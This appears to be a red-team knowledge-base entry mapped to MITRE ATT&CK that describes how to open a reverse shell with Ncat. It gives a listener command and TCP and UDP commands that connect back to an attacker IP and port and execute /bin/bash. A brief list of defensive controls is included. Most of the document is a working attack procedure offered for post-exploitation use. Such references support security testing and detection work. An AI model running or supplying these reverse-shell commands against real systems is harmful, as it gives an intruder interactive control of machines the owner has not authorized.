---
id: 0fa412e0-dfe0-4a8f-9b9c-3cb9c1b8c5e2
name: Establish-Reverse-Shell-with-Ncat
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.425390+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Ncat]]'
  - '[[tags/Reverse Shell]]'
commands:
  - '[[commands/ncat-listen-for-reverse-shell]]'
  - '[[commands/ncat-tcp-reverse-shell]]'
  - '[[commands/ncat-udp-reverse-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Ncat]]'
validated: true
---

# Establish-Reverse-Shell-with-Ncat

## Summary

This procedure demonstrates how to establish a reverse shell using Ncat, a versatile networking tool, to gain remote command execution on a target system by having it connect back to an attacker-controlled listener. It is commonly used in post-exploitation scenarios for lateral movement or command and control after initial access has been achieved.

## Description

In a reverse shell setup, the target system initiates an outbound connection to the attacker's listening host, bypassing inbound firewall restrictions that might block traditional bind shells. Ncat, part of the Nmap project, supports both TCP and UDP protocols for this purpose, with the `-e` option executing a program (like `/bin/bash`) on the target upon connection. This technique is effective in environments where the target has network access to the attacker but not vice versa. It maps to MITRE ATT&CK tactics for Lateral Movement and Command and Control, particularly through remote services. Prerequisites include Ncat installed on both attacker and target systems, and open ports on the attacker's side.

## Requirements

1. Ncat installed on the attacker machine (for listening) and target machine (for connecting back).
2. Network connectivity from the target to the attacker's IP and port (e.g., no outbound firewall blocking TCP/UDP to the listener port).
3. Administrative or user-level access on the target to execute Ncat commands.
4. A listening service set up on the attacker machine before executing the reverse shell on the target.

## Defense

- Implement outbound network filtering to block unauthorized connections to external IPs on non-standard ports.
- Monitor for anomalous processes spawning network connections, such as ncat or nc executing shells (e.g., via Sysmon or endpoint detection tools).
- Use application whitelisting to prevent execution of networking tools like Ncat on endpoints.
- Enable logging of command-line arguments for processes to detect `-e` flag usage tied to shells.

## Objectives

1. Establish a persistent remote shell session from the target to the attacker.
2. Enable command execution on the target via the reverse connection.
3. Demonstrate protocol flexibility with TCP (reliable) and UDP (potentially evasive) options.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before executing the reverse shell on the target, start a listener on the attacker machine to accept the incoming connection. This uses Ncat in listening mode on a specified port.

**Command** ([[commands/ncat-listen-for-reverse-shell]]):
```bash
ncat -l -p $_ATTACKER_PORT
```

> This command binds Ncat to the specified port on all interfaces. Replace `$_ATTACKER_PORT` with your chosen port (e.g., 4242). Expected output is a blank prompt waiting for connections. If a connection succeeds, you will see the target's shell prompt.

### Step 2: Execute TCP Reverse Shell on Target

**Context**: On the compromised target, run the Ncat command to connect back to the attacker and execute a shell, providing interactive access.

**Command** ([[commands/ncat-tcp-reverse-shell]]):
```bash
ncat $_ATTACKER_IP $_ATTACKER_PORT -e /bin/bash
```

> This establishes a TCP connection to the attacker's IP and port, then executes `/bin/bash` piped to the connection for a fully interactive shell. Replace `$_ATTACKER_IP` and `$_ATTACKER_PORT` with actual values. Expected output on the attacker side: a bash prompt from the target (e.g., `user@target:~$`). Test by running commands like `whoami` or `pwd`.

### Step 3: Execute UDP Reverse Shell on Target (Optional Variation)

**Context**: For scenarios where TCP is filtered, use UDP as an alternative protocol. Note that UDP may not support fully interactive shells reliably due to lack of connection reliability.

**Command** ([[commands/ncat-udp-reverse-shell]]):
```bash
ncat --udp $_ATTACKER_IP $_ATTACKER_PORT -e /bin/bash
```

> This uses UDP instead of TCP for the reverse connection. The listener on the attacker must also support UDP (adjust with `--udp` if needed). Expected output is similar to TCP but may drop packets; use for one-way command execution if TCP fails. Verify with basic commands; if unreliable, fall back to TCP.
